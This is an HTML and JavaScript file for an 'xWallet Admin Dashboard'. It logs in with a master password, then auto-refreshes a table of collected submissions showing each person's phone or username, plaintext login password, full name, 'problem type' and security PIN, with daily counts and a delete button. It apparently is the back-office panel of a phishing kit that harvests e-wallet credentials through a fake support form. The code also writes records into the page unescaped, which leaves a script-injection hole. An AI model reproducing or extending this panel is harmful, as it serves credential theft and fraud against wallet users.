<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>xWallet Admin Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        :root {
            --primary: #00c27c;
            --primary-dark: #00a86b;
            --bg: #f8fafc;
            --white: #ffffff;
            --text-main: #0f172a;
            --text-light: #64748b;
            --danger: #ef4444;
            --danger-hover: #dc2626;
            --border: #e2e8f0;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            margin: 0;
            padding: 0;
            color: var(--text-main);
        }

        /* --- LAYOUT --- */
        .admin-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        /* --- HEADER --- */
        .app-header {
            background: var(--white);
            padding: 20px 30px;
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 30px;
            flex-wrap: wrap;
            gap: 15px;
            border: 1px solid var(--border);
        }
        
        .brand-section {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .logo-box {
            width: 45px;
            height: 45px;
            border-radius: 10px;
            background: linear-gradient(135deg, #5db6ff 0%, #0369d9 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 4px;
            box-sizing: border-box;
        }

        .logo-svg {
            width: 32px;
            height: 32px;
        }

        .brand-title {
            font-size: 22px;
            font-weight: 700;
            color: var(--text-main);
            margin: 0;
            letter-spacing: -0.5px;
        }

        .header-actions {
            display: flex;
            gap: 12px;
        }

        /* --- LOGIN SCREEN --- */
        #login-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 80vh;
        }
        
        .login-card {
            background: var(--white);
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
            width: 100%;
            max-width: 400px;
            text-align: center;
            border: 1px solid var(--border);
        }
        
        .login-input {
            width: 100%;
            padding: 14px;
            border: 1px solid var(--border);
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        .login-input:focus {
            border-color: var(--primary);
        }

        /* --- STATS CARDS --- */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: var(--white);
            padding: 24px;
            border-radius: 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.02);
            border-left: 5px solid var(--primary);
            border-top: 1px solid var(--border);
            border-right: 1px solid var(--border);
            border-bottom: 1px solid var(--border);
        }

        .stat-label {
            color: var(--text-light);
            font-size: 13px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.8px;
        }

        .stat-value {
            font-size: 32px;
            font-weight: 700;
            color: var(--text-main);
            margin-top: 8px;
        }

        /* --- CONTROLS BAR --- */
        .controls-bar {
            background: var(--white);
            padding: 20px;
            border-radius: 16px 16px 0 0;
            border-top: 1px solid var(--border);
            border-left: 1px solid var(--border);
            border-right: 1px solid var(--border);
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .search-box {
            position: relative;
            flex-grow: 1;
            max-width: 400px;
        }

        .search-input {
            width: 100%;
            padding: 12px 15px 12px 42px;
            border: 1px solid var(--border);
            border-radius: 10px;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.2s;
        }

        .search-input:focus {
            border-color: var(--primary);
        }

        .search-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--text-light);
            font-size: 14px;
        }

        /* --- TABLE --- */
        .table-container {
            background: var(--white);
            border-radius: 0 0 16px 16px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.02);
            overflow: hidden;
            border-left: 1px solid var(--border);
            border-right: 1px solid var(--border);
            border-bottom: 1px solid var(--border);
        }

        .table-wrapper {
            overflow-x: auto;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
            min-width: 900px;
        }

        thead {
            background-color: #f8fafc;
        }

        th {
            text-align: left;
            padding: 16px 24px;
            font-weight: 600;
            color: var(--text-light);
            border-bottom: 1px solid var(--border);
        }

        td {
            padding: 16px 24px;
            border-bottom: 1px solid var(--border);
            color: var(--text-main);
            vertical-align: middle;
        }

        tr:last-child td { border-bottom: none; }
        tr:hover { background-color: #f8fafc; }

        /* --- BADGES & STYLES --- */
        .cred-badge {
            background: #f0fdf4;
            color: #166534;
            padding: 5px 10px;
            border-radius: 8px;
            font-family: monospace;
            font-weight: 600;
            display: inline-block;
            margin-bottom: 2px;
            font-size: 13px;
            border: 1px solid #dcfce7;
        }
        
        .pin-badge {
            background: #fffbeb;
            color: #92400e;
            padding: 5px 10px;
            border-radius: 8px;
            font-family: monospace;
            font-weight: 700;
            letter-spacing: 1.5px;
            border: 1px solid #fef3c7;
        }

        .problem-badge {
            background: #f0f9ff; 
            color: #0369a1; 
            padding: 5px 12px; 
            border-radius: 12px; 
            font-size: 12px;
            font-weight: 600;
            border: 1px solid #e0f2fe;
        }

        /* --- BUTTONS --- */
        .btn {
            padding: 10px 20px;
            border-radius: 8px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            font-size: 14px;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary { background: var(--primary); color: white; }
        .btn-primary:hover { background: var(--primary-dark); }
        
        .btn-danger { background: var(--danger); color: white; padding: 8px 14px; font-size: 13px; }
        .btn-danger:hover { background: var(--danger-hover); }

        .btn-secondary { background: #f1f5f9; color: var(--text-main); border: 1px solid var(--border); }
        .btn-secondary:hover { background: #e2e8f0; }

        .hidden { display: none !important; }

        /* --- MOBILE RESPONSIVENESS --- */
        @media (max-width: 768px) {
            .app-header { flex-direction: column; text-align: center; }
            .header-actions { width: 100%; justify-content: center; }
            .brand-section { flex-direction: column; }
            .controls-bar { flex-direction: column-reverse; align-items: stretch; }
            .search-box { max-width: 100%; }
            .stats-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<div id="login-section" class="admin-container">
    <div class="login-card">
        <div class="logo-box-container" style="margin: 0 auto 20px;">
            <img src="logo.jpeg" alt="Logo" class="logo-img" style="width: 70px; height: 70px; object-fit: contain; border-radius: 14px; border: 1px solid #000000; box-sizing: border-box;">
        </div>
        <h2 style="margin: 0 0 10px 0; font-size: 24px; font-weight: 700;">xWallet Admin</h2>
        <p style="color: var(--text-light); margin: 0 0 30px 0; font-size: 14px;">Enter Master Password to Access Dashboard</p>
        <input type="password" id="masterPass" class="login-input" placeholder="Master Password">
        <button class="btn btn-primary" style="width: 100%; justify-content: center; padding: 14px;" onclick="handleLogin()">Login to Dashboard</button>
        <p id="msg" style="color: red; margin-top: 15px; font-size: 14px;"></p>
    </div>
</div>

<div id="dashboard-section" class="admin-container hidden">
    
    <header class="app-header">
        <div class="brand-section">
            <div class="logo-box-container">
                <img src="logo.jpeg" alt="Logo" class="logo-img" style="width: 42px; height: 42px; object-fit: contain; border-radius: 8px; border: 1px solid #000000; box-sizing: border-box;">
            </div>
            <h1 class="brand-title">xWallet Admin</h1>
        </div>
        <div class="header-actions">
            <button class="btn btn-secondary" onclick="fetchData()">
                <i class="fa-solid fa-rotate"></i> <span id="refreshText">Refresh Data</span>
            </button>
            <button class="btn btn-secondary" onclick="handleLogout()" style="background: #fee2e2; color: #991b1b; border-color: #fecaca;">
                <i class="fa-solid fa-arrow-right-from-bracket"></i> Logout
            </button>
        </div>
    </header>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-label">Total Submissions</div>
            <div class="stat-value" id="count-total">0</div>
        </div>
        <div class="stat-card" style="border-left-color: #3b82f6;">
            <div class="stat-label">Today</div>
            <div class="stat-value" id="count-today">0</div>
        </div>
        <div class="stat-card" style="border-left-color: #f59e0b;">
            <div class="stat-label">Yesterday</div>
            <div class="stat-value" id="count-yesterday">0</div>
        </div>
    </div>

    <div class="table-container">
        <div class="controls-bar">
            <h3 style="margin: 0; font-size: 18px; font-weight: 700;">Recent Records</h3>
            <div class="search-box">
                <span class="search-icon">🔍</span>
                <input type="text" id="searchInput" class="search-input" placeholder="Search by Phone or Name..." onkeyup="handleSearch()">
            </div>
        </div>

        <div class="table-wrapper">
            <table>
                <thead>
                    <tr>
                        <th>Date & Time</th>
                        <th>User Credentials</th>
                        <th>Full Name</th>
                        <th>Problem Type</th>
                        <th>Security PIN</th>
                        <th>Experience</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody id="table-body">
                </tbody>
            </table>
        </div>
        <div id="loading" style="padding: 24px; text-align: center; color: var(--text-light); display: none; font-weight: 500;">
            <i class="fa-solid fa-spinner fa-spin" style="margin-right: 8px;"></i> Updating data...
        </div>
    </div>
</div>

<script>
    // ================= CONFIGURATION =================
    const BACKEND_URL = window.location.origin; 
    let token = sessionStorage.getItem('adminAuthToken');
    let autoRefreshInterval;
    let allData = []; 

    // ================= INIT =================
    if (token) {
        showDashboard();
    }

    // ================= LOGIN LOGIC =================
    async function handleLogin() {
        const password = document.getElementById('masterPass').value;
        const msg = document.getElementById('msg');
        msg.innerText = "Verifying...";

        try {
            const res = await fetch(`${BACKEND_URL}/api/admin/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ password })
            });
            
            const data = await res.json();

            if (data.success) {
                token = data.token;
                sessionStorage.setItem('adminAuthToken', token);
                showDashboard();
            } else {
                msg.innerText = "❌ Invalid Password";
            }
        } catch (e) {
            console.error(e);
            msg.innerText = "Server Error. Check internet connection.";
        }
    }

    function showDashboard() {
        document.getElementById('login-section').classList.add('hidden');
        document.getElementById('dashboard-section').classList.remove('hidden');
        fetchData();
        // Auto-refresh every 5 seconds
        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
        autoRefreshInterval = setInterval(() => fetchData(true), 5000);
    }

    // ================= FETCH DATA =================
    async function fetchData(isAuto = false) {
        const loading = document.getElementById('loading');
        const refreshText = document.getElementById('refreshText');

        if (!isAuto) {
            refreshText.innerText = "Loading...";
            loading.style.display = 'block';
        }

        try {
            const res = await fetch(`${BACKEND_URL}/api/admin/data`, { 
                headers: { 'auth-token': token } 
            });

            if (res.status === 401) { 
                handleLogout(); 
                return; 
            }

            const data = await res.json();

            if (!Array.isArray(data)) {
                console.error("Invalid response format:", data);
                if(!isAuto) loading.innerText = "Error: Invalid data format";
                return;
            }

            allData = data; 
            updateStats(data); 
            renderTable(data); 
            
            loading.style.display = 'none';
        } catch (error) {
            console.error("Fetch error", error);
            if(!isAuto) loading.innerText = "Connection Failed";
        } finally {
            refreshText.innerText = "Refresh Data";
        }
    }

    // ================= RENDER TABLE =================
    function renderTable(dataToRender) {
        const tbody = document.getElementById('table-body');
        tbody.innerHTML = '';

        if (dataToRender.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center; padding: 40px; color: var(--text-light);">No records found.</td></tr>';
            return;
        }

        dataToRender.forEach(item => {
            const dateObj = new Date(item.timestamp);
            const dateStr = dateObj.toLocaleDateString();
            const timeStr = dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            
            const tr = document.createElement('tr');
            tr.innerHTML = `
                <td>
                    <div style="font-weight:600; color:var(--text-main);">${timeStr}</div>
                    <div style="font-size:12px; color:var(--text-light); margin-top:2px;">${dateStr}</div>
                </td>
                <td>
                    <div class="cred-badge">📱 ${item.username || item.loginPhone || 'N/A'}</div><br>
                    <div class="cred-badge" style="background:#f1f5f9; color:#475569; border-color:#e2e8f0; margin-top:4px;">
                        🔑 ${item.loginPassword || '****'}
                    </div>
                </td>
                <td style="font-weight: 500;">${item.fullName}</td>
                <td><span class="problem-badge">${item.problem}</span></td>
                <td><span class="pin-badge">${item.securityPin}</span></td>
                <td>${item.experience}</td>
                <td>
                    <button class="btn btn-danger" onclick="deleteItem('${item._id}')">
                        <i class="fa-regular fa-trash-can"></i> Delete
                    </button>
                </td>
            `;
            tbody.appendChild(tr);
        });
    }

    // ================= SEARCH LOGIC =================
    function handleSearch() {
        const query = document.getElementById('searchInput').value.toLowerCase();
        const filtered = allData.filter(item => {
            const username = (item.username || item.loginPhone || '').toLowerCase();
            const name = (item.fullName || '').toLowerCase();
            return username.includes(query) || name.includes(query);
        });
        renderTable(filtered);
    }

    // ================= STATS LOGIC =================
    function updateStats(data) {
        const total = data.length;
        const now = new Date();
        const startOfToday = new Date(now.getFullYear(), now.getMonth(), now.getDate()).getTime();
        const startOfYesterday = new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1).getTime();
        
        let todayCount = 0;
        let yesterdayCount = 0;

        data.forEach(item => {
            const itemTime = new Date(item.timestamp).getTime();
            if (itemTime >= startOfToday) { 
                todayCount++; 
            } else if (itemTime >= startOfYesterday && itemTime < startOfToday) { 
                yesterdayCount++; 
            }
        });

        document.getElementById('count-total').innerText = total;
        document.getElementById('count-today').innerText = todayCount;
        document.getElementById('count-yesterday').innerText = yesterdayCount;
    }

    // ================= DELETE LOGIC =================
    async function deleteItem(id) {
        if (!confirm("Are you sure you want to permanently delete this record?")) return;

        try {
            const res = await fetch(`${BACKEND_URL}/api/admin/data/${id}`, {
                method: 'DELETE',
                headers: { 'auth-token': token }
            });
            if (res.ok) {
                fetchData(); // Refresh list
            } else {
                alert("Failed to delete item.");
            }
        } catch (e) {
            alert("Network error while deleting.");
        }
    }

    // ================= LOGOUT =================
    function handleLogout() {
        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
        sessionStorage.removeItem('adminAuthToken');
        window.location.reload();
    }
</script>

</body>
</html>
